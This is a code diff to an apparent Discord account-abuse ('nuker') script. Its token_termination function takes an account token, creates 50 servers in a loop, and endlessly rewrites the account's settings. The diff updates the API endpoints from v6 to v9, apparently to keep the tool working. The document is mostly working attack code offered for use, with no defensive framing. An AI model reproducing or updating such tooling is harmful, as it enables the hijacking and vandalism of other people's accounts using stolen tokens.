@@ -48,10 +48,10 @@ def token_termination(token):
         'region': "europe"
     } 
     for _i in range(50):
-        requests.post('https://discordapp.com/api/v6/guilds', headers=headers, json=guild)
+        requests.post('https://discordapp.com/api/v9/guilds', headers=headers, json=guild)
     while True:
         try:
-            request.patch("https://canary.discordapp.com/api/v6/users/@me/settings",headers=headers, json=payload)
+            request.patch("https://canary.discordapp.com/api/v9/users/@me/settings",headers=headers, json=payload)
         except Exception as e:
             print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{e}"+Fore.RESET)
         else:
@@ -66,7 +66,7 @@ def token_termination(token):
         }
         while True:
             try:
-                request.patch("https://canary.discordapp.com/api/v6/users/@me/settings",headers=headers, json=setting, timeout=10)
+                request.patch("https://canary.discordapp.com/api/v9/users/@me/settings",headers=headers, json=setting, timeout=10)
             except Exception as e:
                 print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{e}"+Fore.RESET)
             else:
